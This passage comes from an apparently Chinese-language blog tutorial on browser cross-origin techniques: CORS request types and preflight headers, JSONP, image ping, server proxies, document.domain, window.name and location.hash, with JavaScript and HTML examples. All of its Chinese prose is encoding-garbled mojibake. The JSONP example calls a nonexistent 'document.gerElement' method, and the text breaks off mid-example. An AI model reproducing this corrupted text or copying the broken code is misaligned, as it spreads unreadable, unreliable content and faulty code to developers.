<p>æ•´ä¸ª CORS é€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚å¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒCORS é€šä¿¡ä¸åŒæºçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç° AJAX è¯·æ±‚è·¨æºï¼Œå°±ä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„Ÿè§‰ã€‚</p>
<p>å› æ­¤ï¼Œå®ç° CORS é€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº† CORS æ¥å£ï¼Œå°±å¯ä»¥è·¨æºé€šä¿¡ã€‚</p>
<p>æµè§ˆå™¨å°†CORSè¯·æ±‚åˆ†æˆä¸¤ç±»ï¼š<code>ç®€å•è¯·æ±‚ï¼ˆsimple request</code>ï¼‰å’Œ<code>éç®€å•è¯·æ±‚ï¼ˆnot-so-simple request</code>ï¼‰ã€‚</p>
</blockquote>
<p>åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤å¤§æ¡ä»¶ï¼Œå°±å±äº<strong>ç®€å•è¯·æ±‚</strong>ã€‚</p>
<blockquote>
<p>1.è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ä¹‹ä¸€ï¼š</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>2.HTTPçš„å¤´ä¿¡æ¯ä¸è¶…å‡ºä»¥ä¸‹å‡ ç§å­—æ®µï¼š</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Typeï¼šåªé™äºä¸‰ä¸ªå€¼ application&#x2F;x-www-form-urlencodedã€multipart&#x2F;form-dataã€text&#x2F;plain</li>
</ul>
</blockquote>
<p>å‡¡æ˜¯ä¸åŒæ—¶æ»¡è¶³ä¸Šé¢ä¸¤ä¸ªæ¡ä»¶ï¼Œå°±å±äº<strong>éç®€å•è¯·æ±‚</strong>ã€‚</p>
<p>æµè§ˆå™¨å¯¹è¿™ä¸¤ç§è¯·æ±‚çš„å¤„ç†ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚</p>
<h3 id="ç®€å•è¯·æ±‚"><a href="#ç®€å•è¯·æ±‚" class="headerlink" title="ç®€å•è¯·æ±‚"></a>ç®€å•è¯·æ±‚</h3><blockquote>
<ol>
<li>åœ¨è¯·æ±‚ä¸­éœ€è¦é™„åŠ ä¸€ä¸ªé¢å¤–çš„ Origin å¤´éƒ¨ï¼Œå…¶ä¸­åŒ…å«è¯·æ±‚é¡µé¢çš„æºä¿¡æ¯ï¼ˆåè®®ã€åŸŸåå’Œç«¯å£ï¼‰ï¼Œä»¥ä¾¿æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå¤´éƒ¨ä¿¡æ¯æ¥å†³å®šæ˜¯å¦ç»™äºˆå“åº”ã€‚ä¾‹å¦‚ï¼š<code>Origin: http://www.laixiangran.cn</code></li>
<li>å¦‚æœæœåŠ¡å™¨è®¤ä¸ºè¿™ä¸ªè¯·æ±‚å¯ä»¥æ¥å—ï¼Œå°±åœ¨ Access-Control-Allow-Origin å¤´éƒ¨ä¸­å›å‘ç›¸åŒçš„æºä¿¡æ¯ï¼ˆå¦‚æœæ˜¯å…¬å…±èµ„æºï¼Œå¯ä»¥å›å‘ * ï¼‰ã€‚ä¾‹å¦‚ï¼š<code>Access-Control-Allow-Originï¼šhttp://www.laixiangran.cn</code></li>
<li>æ²¡æœ‰è¿™ä¸ªå¤´éƒ¨æˆ–è€…æœ‰è¿™ä¸ªå¤´éƒ¨ä½†æºä¿¡æ¯ä¸åŒ¹é…ï¼Œæµè§ˆå™¨å°±ä¼šé©³å›è¯·æ±‚ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šå¤„ç†è¯·æ±‚ã€‚æ³¨æ„ï¼Œè¯·æ±‚å’Œå“åº”éƒ½ä¸åŒ…å« cookie ä¿¡æ¯ã€‚</li>
<li>å¦‚æœéœ€è¦åŒ…å« cookie ä¿¡æ¯ï¼Œajax è¯·æ±‚éœ€è¦è®¾ç½® xhr çš„å±æ€§ withCredentials ä¸º trueï¼ŒæœåŠ¡å™¨éœ€è¦è®¾ç½®å“åº”å¤´éƒ¨ <code>Access-Control-Allow-Credentials: true</code>ã€‚</li>
</ol>
</blockquote>
<h3 id="éç®€å•è¯·æ±‚"><a href="#éç®€å•è¯·æ±‚" class="headerlink" title="éç®€å•è¯·æ±‚"></a>éç®€å•è¯·æ±‚</h3><p>æµè§ˆå™¨åœ¨å‘é€çœŸæ­£çš„è¯·æ±‚ä¹‹å‰ï¼Œä¼šå…ˆå‘é€ä¸€ä¸ª Preflight è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œè¿™ç§è¯·æ±‚ä½¿ç”¨ OPTIONS æ–¹æ³•ï¼Œå‘é€ä¸‹åˆ—å¤´éƒ¨ï¼š</p>
<blockquote>
<ul>
<li>Originï¼šä¸ç®€å•çš„è¯·æ±‚ç›¸åŒã€‚</li>
<li>Access-Control-Request-Method: è¯·æ±‚è‡ªèº«ä½¿ç”¨çš„æ–¹æ³•ã€‚</li>
<li>Access-Control-Request-Headers: ï¼ˆå¯é€‰ï¼‰è‡ªå®šä¹‰çš„å¤´éƒ¨ä¿¡æ¯ï¼Œå¤šä¸ªå¤´éƒ¨ä»¥é€—å·åˆ†éš”ã€‚</li>
</ul>
</blockquote>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">Origin: http://www.laixiangran.cn</span></span><br><span class="line"><span class="section">Access-Control-Request-Method: POST</span></span><br><span class="line"><span class="section">Access-Control-Request-Headers: NCZ</span></span><br></pre></td></tr></table></figure>

<p>å‘é€è¿™ä¸ªè¯·æ±‚åï¼ŒæœåŠ¡å™¨å¯ä»¥å†³å®šæ˜¯å¦å…è®¸è¿™ç§ç±»å‹çš„è¯·æ±‚ã€‚æœåŠ¡å™¨é€šè¿‡åœ¨å“åº”ä¸­å‘é€å¦‚ä¸‹å¤´éƒ¨ä¸æµè§ˆå™¨è¿›è¡Œæ²Ÿé€šï¼š</p>
<blockquote>
<ul>
<li>Access-Control-Allow-Originï¼šä¸ç®€å•çš„è¯·æ±‚ç›¸åŒã€‚</li>
<li>Access-Control-Allow-Methods: å…è®¸çš„æ–¹æ³•ï¼Œå¤šä¸ªæ–¹æ³•ä»¥é€—å·åˆ†éš”ã€‚</li>
<li>Access-Control-Allow-Headers: å…è®¸çš„å¤´éƒ¨ï¼Œå¤šä¸ªæ–¹æ³•ä»¥é€—å·åˆ†éš”ã€‚</li>
<li>Access-Control-Max-Age: åº”è¯¥å°†è¿™ä¸ª Preflight è¯·æ±‚ç¼“å­˜å¤šé•¿æ—¶é—´ï¼ˆä»¥ç§’è¡¨ç¤ºï¼‰ã€‚</li>
</ul>
</blockquote>
<p>ä¾‹å¦‚ï¼š</p>
<blockquote>
<p>Access-Control-Allow-Origin: <a href="http://www.laixiangran.cn/">http://www.laixiangran.cn</a><br>Access-Control-Allow-Methods: GET, POST<br>Access-Control-Allow-Headers: NCZ<br>Access-Control-Max-Age: 1728000</p>
</blockquote>
<p>ä¸€æ—¦æœåŠ¡å™¨é€šè¿‡ Preflight è¯·æ±‚å…è®¸è¯¥è¯·æ±‚ä¹‹åï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨æ­£å¸¸çš„ CORS è¯·æ±‚ï¼Œå°±éƒ½è·Ÿç®€å•è¯·æ±‚ä¸€æ ·äº†ã€‚</p>
<h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><blockquote>
<ul>
<li>CORS é€šä¿¡ä¸åŒæºçš„ AJAX é€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ï¼Œå®¹æ˜“ç»´æŠ¤ã€‚</li>
<li>æ”¯æŒæ‰€æœ‰ç±»å‹çš„ HTTP è¯·æ±‚ã€‚</li>
</ul>
</blockquote>
<h3 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><blockquote>
<ul>
<li>å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯ IE10 ä»¥ä¸‹çš„æµè§ˆå™¨ã€‚</li>
<li>ç¬¬ä¸€æ¬¡å‘é€éç®€å•è¯·æ±‚æ—¶ä¼šå¤šä¸€æ¬¡è¯·æ±‚ã€‚</li>
</ul>
</blockquote>
<h2 id="JSONP-è·¨åŸŸ"><a href="#JSONP-è·¨åŸŸ" class="headerlink" title="JSONP è·¨åŸŸ"></a>JSONP è·¨åŸŸ</h2><blockquote>
<p>ç”±äº <code>script</code> æ ‡ç­¾ä¸å—æµè§ˆå™¨åŒæºç­–ç•¥çš„å½±å“ï¼Œå…è®¸è·¨åŸŸå¼•ç”¨èµ„æºã€‚å› æ­¤å¯ä»¥é€šè¿‡åŠ¨æ€åˆ›å»º script æ ‡ç­¾ï¼Œç„¶ååˆ©ç”¨ src å±æ€§è¿›è¡Œè·¨åŸŸï¼Œè¿™ä¹Ÿå°±æ˜¯ JSONP è·¨åŸŸçš„åŸºæœ¬åŸç†ã€‚</p>
</blockquote>
<p>ç›´æ¥é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¯´æ˜ JSONP å®ç°è·¨åŸŸçš„æµç¨‹ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">// 1. å®šä¹‰ä¸€ä¸ª å›è°ƒå‡½æ•° handleResponse ç”¨æ¥æ¥æ”¶è¿”å›çš„æ•°æ®</span><br><span class="line">function handleResponse(data) &#123;</span><br><span class="line">    console.log(data)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 2. åŠ¨æ€åˆ›å»ºä¸€ä¸ª script æ ‡ç­¾ï¼Œå¹¶ä¸”å‘Šè¯‰åç«¯å›è°ƒå‡½æ•°åå« handleResponse</span><br><span class="line">var <span class="attr">body</span> = document.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">var <span class="attr">script</span> = document.gerElement(<span class="string">&#x27;script&#x27;</span>)<span class="comment">;</span></span><br><span class="line"><span class="attr">script.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/json?callback=handleResponse&#x27;</span><span class="comment">;</span></span><br><span class="line">body.appendChild(script)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 3. é€šè¿‡ script.src è¯·æ±‚ `http://www.laixiangran.cn/json?<span class="attr">callback</span>=handleResponse`ï¼Œ</span><br><span class="line">// 4. åç«¯èƒ½å¤Ÿè¯†åˆ«è¿™æ ·çš„ URL æ ¼å¼å¹¶å¤„ç†è¯¥è¯·æ±‚ï¼Œç„¶åè¿”å› handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) ç»™æµè§ˆå™¨</span><br><span class="line">// 5. æµè§ˆå™¨åœ¨æ¥æ”¶åˆ° handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) ä¹‹åç«‹å³æ‰§è¡Œ ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œ handleResponse æ–¹æ³•ï¼Œè·å¾—åç«¯è¿”å›çš„æ•°æ®ï¼Œè¿™æ ·å°±å®Œæˆä¸€æ¬¡è·¨åŸŸè¯·æ±‚äº†ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="ä¼˜ç‚¹-1"><a href="#ä¼˜ç‚¹-1" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><blockquote>
<ul>
<li>ä½¿ç”¨ç®€ä¾¿ï¼Œæ²¡æœ‰å…¼å®¹æ€§é—®é¢˜ï¼Œç›®å‰æœ€æµè¡Œçš„ä¸€ç§è·¨åŸŸæ–¹æ³•ã€‚</li>
</ul>
</blockquote>
<h3 id="ç¼ºç‚¹-1"><a href="#ç¼ºç‚¹-1" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><blockquote>
<ul>
<li>åªæ”¯æŒ GET è¯·æ±‚ã€‚</li>
<li>ç”±äºæ˜¯ä»å…¶å®ƒåŸŸä¸­åŠ è½½ä»£ç æ‰§è¡Œï¼Œå› æ­¤å¦‚æœå…¶ä»–åŸŸä¸å®‰å…¨ï¼Œå¾ˆå¯èƒ½ä¼šåœ¨å“åº”ä¸­å¤¹å¸¦ä¸€äº›æ¶æ„ä»£ç ã€‚</li>
<li>è¦ç¡®å®š JSONP è¯·æ±‚æ˜¯å¦å¤±è´¥å¹¶ä¸å®¹æ˜“ã€‚è™½ç„¶ HTML5 ç»™ script æ ‡ç­¾æ–°å¢äº†ä¸€ä¸ª onerror äº‹ä»¶å¤„ç†ç¨‹åºï¼Œä½†æ˜¯å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ã€‚</li>
</ul>
</blockquote>
<h2 id="å›¾åƒ-Ping-è·¨åŸŸ"><a href="#å›¾åƒ-Ping-è·¨åŸŸ" class="headerlink" title="å›¾åƒ Ping è·¨åŸŸ"></a>å›¾åƒ Ping è·¨åŸŸ</h2><blockquote>
<p>ç”±äº <code>img</code> æ ‡ç­¾ä¸å—æµè§ˆå™¨åŒæºç­–ç•¥çš„å½±å“ï¼Œå…è®¸è·¨åŸŸå¼•ç”¨èµ„æºã€‚</p>
<p>å› æ­¤å¯ä»¥é€šè¿‡ img æ ‡ç­¾çš„ src å±æ€§è¿›è¡Œè·¨åŸŸï¼Œè¿™ä¹Ÿå°±æ˜¯å›¾åƒ Ping è·¨åŸŸçš„åŸºæœ¬åŸç†ã€‚</p>
</blockquote>
<p>ç›´æ¥é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¯´æ˜å›¾åƒ Ping å®ç°è·¨åŸŸçš„æµç¨‹ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">var <span class="attr">img</span> = new Image()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// é€šè¿‡ onload åŠ onerror äº‹ä»¶å¯ä»¥çŸ¥é“å“åº”æ˜¯ä»€ä¹ˆæ—¶å€™æ¥æ”¶åˆ°çš„ï¼Œä½†æ˜¯ä¸èƒ½è·å–å“åº”æ–‡æœ¬</span><br><span class="line"><span class="attr">img.onload</span> = img.<span class="literal">on</span>error = function() &#123;</span><br><span class="line">    console.log(&quot;Done!&quot;)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// è¯·æ±‚æ•°æ®é€šè¿‡æŸ¥è¯¢å­—ç¬¦ä¸²å½¢å¼å‘é€</span><br><span class="line"><span class="attr">img.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/test?name=laixiangran&#x27;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h3 id="ä¼˜ç‚¹-2"><a href="#ä¼˜ç‚¹-2" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><blockquote>
<ul>
<li>ç”¨äºå®ç°è·Ÿè¸ªç”¨æˆ·ç‚¹å‡»é¡µé¢æˆ–åŠ¨æ€å¹¿å‘Šæ›å…‰æ¬¡æ•°æœ‰è¾ƒå¤§çš„ä¼˜åŠ¿ã€‚</li>
</ul>
</blockquote>
<h3 id="ç¼ºç‚¹-2"><a href="#ç¼ºç‚¹-2" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><blockquote>
<ul>
<li>åªæ”¯æŒ GET è¯·æ±‚ã€‚</li>
<li>åªèƒ½æµè§ˆå™¨ä¸æœåŠ¡å™¨çš„å•å‘é€šä¿¡ï¼Œå› ä¸ºæµè§ˆå™¨ä¸èƒ½è®¿é—®æœåŠ¡å™¨çš„å“åº”æ–‡æœ¬ã€‚</li>
</ul>
</blockquote>
<h2 id="æœåŠ¡å™¨ä»£ç†"><a href="#æœåŠ¡å™¨ä»£ç†" class="headerlink" title="æœåŠ¡å™¨ä»£ç†"></a>æœåŠ¡å™¨ä»£ç†</h2><blockquote>
<p>æµè§ˆå™¨æœ‰è·¨åŸŸé™åˆ¶ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸å­˜åœ¨è·¨åŸŸé—®é¢˜ï¼Œæ‰€ä»¥å¯ä»¥ç”±æœåŠ¡å™¨è¯·æ±‚æ‰€æœ‰åŸŸçš„èµ„æºå†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
<p>**<u>æœåŠ¡å™¨ä»£ç†æ˜¯ä¸‡èƒ½çš„</u>**ã€‚</p>
</blockquote>
<h2 id="document-domain-è·¨åŸŸ"><a href="#document-domain-è·¨åŸŸ" class="headerlink" title="document.domain è·¨åŸŸ"></a>document.domain è·¨åŸŸ</h2><blockquote>
<p>å¯¹äºä¸»åŸŸåç›¸åŒï¼Œè€Œå­åŸŸåä¸åŒçš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ document.domain æ¥è·¨åŸŸã€‚è¿™ç§æ–¹å¼éå¸¸é€‚ç”¨äº iframe è·¨åŸŸçš„æƒ…å†µã€‚</p>
</blockquote>
<p>æ¯”å¦‚ï¼Œ</p>
<p>æœ‰ä¸€ä¸ªé¡µé¢ï¼Œå®ƒçš„åœ°å€æ˜¯ <code>http://www.laixiangran.cn/a.html</code>ï¼Œåœ¨è¿™ä¸ªé¡µé¢é‡Œé¢æœ‰ä¸€ä¸ª iframeï¼Œå®ƒçš„ src æ˜¯ <code>http://laixiangran.cn/b.html</code>ã€‚</p>
<blockquote>
<p>å¾ˆæ˜¾ç„¶ï¼Œè¿™ä¸ªé¡µé¢ä¸å®ƒé‡Œé¢çš„ iframe æ¡†æ¶æ˜¯ä¸åŒåŸŸçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯æ— æ³•é€šè¿‡åœ¨é¡µé¢ä¸­ä¹¦å†™ js ä»£ç æ¥è·å– iframe ä¸­çš„ä¸œè¥¿çš„ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œdocument.domain å°±å¯ä»¥æ´¾ä¸Šç”¨åœºäº†ï¼Œæˆ‘ä»¬åªè¦æŠŠ <code>http://www.laixiangran.cn/a.html</code> å’Œ <code>http://laixiangran.cn/b.html</code> è¿™ä¸¤ä¸ªé¡µé¢çš„ document.domain éƒ½è®¾æˆç›¸åŒçš„åŸŸåå°±å¯ä»¥äº†ã€‚ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œdocument.domain çš„è®¾ç½®æ˜¯æœ‰é™åˆ¶çš„ï¼Œæˆ‘ä»¬åªèƒ½æŠŠ document.domain è®¾ç½®æˆè‡ªèº«æˆ–æ›´é«˜ä¸€çº§çš„çˆ¶åŸŸï¼Œä¸”ä¸»åŸŸå¿…é¡»ç›¸åŒã€‚ä¾‹å¦‚ï¼š<code>a.b.laixiangran.cn</code> ä¸­æŸä¸ªæ–‡æ¡£çš„ document.domain å¯ä»¥è®¾æˆ <code>a.b.laixiangran.cn</code>ã€<code>b.laixiangran.cn</code> ã€<code>laixiangran.cn</code> ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œä½†æ˜¯ä¸å¯ä»¥è®¾æˆ <code>c.a.b.laixiangran.cn</code> ï¼Œå› ä¸ºè¿™æ˜¯å½“å‰åŸŸçš„å­åŸŸï¼Œä¹Ÿä¸å¯ä»¥è®¾æˆ <code>baidu.com</code>ï¼Œå› ä¸ºä¸»åŸŸå·²ç»ä¸ç›¸åŒäº†ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚ï¼Œåœ¨é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> ä¸­è®¾ç½®document.domainï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// è®¾ç½®æˆä¸»åŸŸ</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>).<span class="property">contentWindow</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨é¡µé¢ <code>http://laixiangran.cn/b.html</code> ä¸­ä¹Ÿè®¾ç½® document.domainï¼Œè€Œä¸”è¿™ä¹Ÿæ˜¯å¿…é¡»çš„ï¼Œè™½ç„¶è¿™ä¸ªæ–‡æ¡£çš„ domain å°±æ˜¯ <code>laixiangran.cn</code>ï¼Œä½†æ˜¯è¿˜æ˜¯å¿…é¡»æ˜¾å¼åœ°è®¾ç½® document.domain çš„å€¼ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// document.domain è®¾ç½®æˆä¸ä¸»é¡µé¢ç›¸åŒ</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ï¼Œ<code>http://www.laixiangran.cn/a.html</code> å°±å¯ä»¥é€šè¿‡ js è®¿é—®åˆ° <code>http://laixiangran.cn/b.html</code> ä¸­çš„å„ç§å±æ€§å’Œå¯¹è±¡äº†ã€‚</p>
<h2 id="window-name-è·¨åŸŸ"><a href="#window-name-è·¨åŸŸ" class="headerlink" title="window.name è·¨åŸŸ"></a><a href="https://link.juejin.cn/?target=http://window.name">window.name</a> è·¨åŸŸ</h2><blockquote>
<p>window å¯¹è±¡æœ‰ä¸ª name å±æ€§ï¼Œè¯¥å±æ€§æœ‰ä¸ªç‰¹å¾ï¼šå³åœ¨ä¸€ä¸ªçª—å£ï¼ˆwindowï¼‰çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œçª—å£è½½å…¥çš„æ‰€æœ‰çš„é¡µé¢ï¼ˆä¸ç®¡æ˜¯ç›¸åŒåŸŸçš„é¡µé¢è¿˜æ˜¯ä¸åŒåŸŸçš„é¡µé¢ï¼‰éƒ½æ˜¯å…±äº«ä¸€ä¸ª <code>window.name</code> çš„ï¼Œæ¯ä¸ªé¡µé¢å¯¹ <code>window.name</code> éƒ½æœ‰è¯»å†™çš„æƒé™ï¼Œ<code>window.name</code> æ˜¯æŒä¹…å­˜åœ¨ä¸€ä¸ªçª—å£è½½å…¥è¿‡çš„æ‰€æœ‰é¡µé¢ä¸­çš„ï¼Œå¹¶ä¸ä¼šå› æ–°é¡µé¢çš„è½½å…¥è€Œè¿›è¡Œé‡ç½®ã€‚</p>
</blockquote>
<p>é€šè¿‡ä¸‹é¢çš„ä¾‹å­ä»‹ç»å¦‚ä½•é€šè¿‡ <a href="https://link.juejin.cn/?target=http://window.name">window.name</a> æ¥è·¨åŸŸè·å–æ•°æ®çš„ã€‚</p>
<p>é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> çš„ä»£ç ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframeè½½å…¥ &quot;http://laixiangran.cn/b.html é¡µé¢åä¼šæ‰§è¡Œè¯¥å‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// é‡ç½® iframe çš„ onload äº‹ä»¶ç¨‹åºï¼Œ</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// æ­¤æ—¶ç»è¿‡åé¢ä»£ç é‡ç½® src ä¹‹åï¼Œ</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// http://www.laixiangran.cn/a.html é¡µé¢ä¸è¯¥ iframe åœ¨åŒä¸€ä¸ªæºäº†ï¼Œå¯ä»¥ç›¸äº’è®¿é—®äº†</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> data = iframe.<span class="property">contentWindow</span>.<span class="property">name</span>; <span class="comment">// 4. è·å– iframe é‡Œçš„ window.name</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// hello world!</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. é‡ç½®ä¸€ä¸ªä¸ http://www.laixiangran.cn/a.html é¡µé¢åŒæºçš„é¡µé¢</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">src</span> = <span class="string">&#x27;http://www.laixiangran.cn/c.html&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¡µé¢ <code>http://laixiangran.cn/b.html</code> çš„ä»£ç ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. ç»™å½“å‰çš„ window.name è®¾ç½®ä¸€ä¸ª http://www.laixiangran.cn/a.html é¡µé¢æƒ³è¦å¾—åˆ°çš„æ•°æ®å€¼ </span><br><span class="line">    <span class="attr">window.name</span> = <span class="string">&quot;hello world!&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="location-hash-è·¨åŸŸ"><a href="#location-hash-è·¨åŸŸ" class="headerlink" title="location.hash è·¨åŸŸ"></a>location.hash è·¨åŸŸ</h2><blockquote>
<p>location.hash æ–¹å¼è·¨åŸŸï¼Œæ˜¯å­æ¡†æ¶ä¿®æ”¹çˆ¶æ¡†æ¶ src çš„ hash å€¼ï¼Œé€šè¿‡è¿™ä¸ªå±æ€§è¿›è¡Œä¼ é€’æ•°æ®ï¼Œä¸”æ›´æ”¹ hash å€¼ï¼Œé¡µé¢ä¸ä¼šåˆ·æ–°ã€‚ä½†æ˜¯ä¼ é€’çš„æ•°æ®çš„å­—èŠ‚æ•°æ˜¯æœ‰é™çš„ã€‚</p>
</blockquote>
<p>é¡µé¢ <code>http://www.laixiangran.cn/a.html</code> çš„ä»£ç ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframeè½½å…¥ &quot;http://laixiangran.cn/b.html é¡µé¢åä¼šæ‰§è¡Œè¯¥å‡½æ•°</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. è·å–é€šè¿‡ http://laixiangran.cn/b.html é¡µé¢è®¾ç½® hash 